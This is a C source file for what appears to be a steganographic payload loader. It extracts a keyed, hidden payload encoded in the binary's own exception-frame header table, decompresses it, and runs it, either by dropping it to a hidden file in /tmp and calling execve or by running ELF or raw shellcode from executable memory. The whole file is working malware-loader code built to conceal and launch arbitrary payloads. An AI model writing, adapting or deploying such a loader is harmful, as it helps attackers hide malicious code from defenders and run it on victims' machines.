
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <link.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include "puff.h"

#include "selfsteg.h"
#include "elfrun.h"
#include "protocol.h"
#include "runmode.h"
#include "stegcode.h"

extern const ElfW(Ehdr) __ehdr_start;

char *g_dropped_path = NULL;

static uint8_t *zinflate(const uint8_t *src, size_t slen, size_t *outlen)
{
    if (slen == 0 || slen > PAY_MAX_PLEN)
        return NULL;
    size_t cap = slen * 4 + 4096;
    if (cap > PAY_MAX_PLEN)
        cap = PAY_MAX_PLEN;
    for (;;) {
        uint8_t *out = malloc(cap);
        if (!out) return NULL;
        unsigned long dlen = (unsigned long)cap;
        unsigned long sl = (unsigned long)slen;
        int r = puff(out, &dlen, src, &sl);
        if (r == 0) {
            *outlen = (size_t)dlen;
            return out;
        }
        free(out);
        if (r != 1 || cap >= PAY_MAX_PLEN)
            return NULL;
        cap *= 2;
        if (cap > PAY_MAX_PLEN)
            cap = PAY_MAX_PLEN;
    }
}

#if PAY_RUN_FILE
static int run_payload_file(const uint8_t *pl, size_t plen)
{
    char tmpl[] = "/tmp/.zst-XXXXXX";
    int fd = mkstemp(tmpl);
    if (fd < 0) { perror("mkstemp"); return -1; }
    ssize_t w = write(fd, pl, plen);
    if (w != (ssize_t)plen || fchmod(fd, 0700) != 0) {
        perror("write/fchmod");
        close(fd);
        unlink(tmpl);
        return -1;
    }
    close(fd);
    if (g_dropped_path)
        snprintf(g_dropped_path, 64, "%s", tmpl);
    extern char **environ;
    char *const argv[] = { tmpl, NULL };
    execve(tmpl, argv, environ);
    perror("execve");
    _exit(126);
}
#endif

static int run_payload(const uint8_t *pl, size_t plen)
{
#if PAY_RUN_FILE
    return run_payload_file(pl, plen);
#else
    if (plen >= 4 && memcmp(pl, ELFMAG, 4) == 0) {
        return elf_run(pl, plen);
    } else {
        void *mem = mmap(NULL, plen, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (mem == MAP_FAILED) return -1;
        memcpy(mem, pl, plen);
        if (mprotect(mem, plen, PROT_READ | PROT_EXEC) != 0) {
            munmap(mem, plen);
            return -1;
        }
        ((void (*)(void))mem)();
        return 0;
    }
#endif
}

static int64_t pe_read(const uint8_t **pp, unsigned enc, const uint8_t *hdr,
                     const uint8_t *end)
{
    const uint8_t *p = *pp;
    const uint8_t *field = p;
    uint64_t v = 0;
    int sz = 0, sgn = 0;
    switch (enc & 0x0f) {
    case 0x00: sz = (int)sizeof(void *); break;
    case 0x02: sz = 2; break;
    case 0x03: sz = 4; break;
    case 0x04: sz = 8; break;
    case 0x0a: sz = 2; sgn = 1; break;
    case 0x0b: sz = 4; sgn = 1; break;
    case 0x0c: sz = 8; sgn = 1; break;
    default: return -1;
    }
    if ((size_t)(end - p) < (size_t)sz)
        return -1;
    if (sgn) {
        int64_t t = 0;
        if (sz == 2) { int16_t s; memcpy(&s, p, 2); t = s; }
        else if (sz == 4) { int32_t s; memcpy(&s, p, 4); t = s; }
        else { memcpy(&t, p, 8); }
        v = (uint64_t)t;
    } else {
        memcpy(&v, p, (size_t)sz);
    }
    p += sz;
    uint64_t fld = (uint64_t)(uintptr_t)field;
    switch (enc & 0x70) {
    case 0x10: v += fld; break;
    case 0x30: v += (uint64_t)(uintptr_t)hdr; break;
    }
    *pp = p;
    return (int64_t)v;
}

static const uint8_t *find_eh_frame_hdr(size_t *out_len)
{
    const ElfW(Ehdr) *eh = &__ehdr_start;
    const ElfW(Phdr) *ph = (const ElfW(Phdr) *)((const uint8_t *)eh + eh->e_phoff);
    uintptr_t bias = eh->e_type == ET_DYN ? (uintptr_t)eh : 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type == PT_GNU_EH_FRAME) {
            *out_len = ph[i].p_filesz;
            return (const uint8_t *)(ph[i].p_vaddr + bias);
        }
    }
    return NULL;
}

static uint64_t *read_locs(int *out_n)
{
    size_t hdr_len = 0;
    const uint8_t *hdr = find_eh_frame_hdr(&hdr_len);
    if (!hdr || hdr_len < 8)
        return NULL;

    const uint8_t *end = hdr + hdr_len;
    const uint8_t *p = hdr + 4;
    if (pe_read(&p, hdr[1], hdr, end) < 0) return NULL;
    int64_t cnt = pe_read(&p, hdr[2], hdr, end);
    if (cnt <= 0 || cnt > (1 << 20)) return NULL;
    int n = (int)cnt;

    uint64_t *locs = malloc((size_t)n * sizeof *locs);
    if (!locs) return NULL;
    for (int i = 0; i < n; i++) {
        int64_t loc = pe_read(&p, hdr[3], hdr, end);
        if (loc < 0) { free(locs); return NULL; }
        locs[i] = (uint64_t)loc;
        if (pe_read(&p, hdr[3], hdr, end) < 0) { free(locs); return NULL; }
    }
    *out_n = n;
    return locs;
}

int self_analyze_exec(void)
{
    int n = 0;
    uint64_t *locs = read_locs(&n);
    if (!locs || n < 16) {
        free(locs);
        return -1;
    }

    char err[128];
    uint8_t *defl = NULL;
    size_t dlen = 0;
    int shape = -1;
    if (zs_steg_decode(locs, n, PAY_KEY, &defl, &dlen, &shape, err, sizeof err) != 0) {
        free(locs);
        return -1;
    }
    free(locs);

    size_t plen = 0;
    uint8_t *pl = zinflate(defl, dlen, &plen);
    free(defl);
    if (!pl)
        return -1;

    int rc = -1;
    if (plen >= 4 && memcmp(pl, ELFMAG, 4) == 0) {
        int r = run_payload(pl, plen);
        if (r == 0) rc = 0;
    }
    free(pl);
    return rc;
}
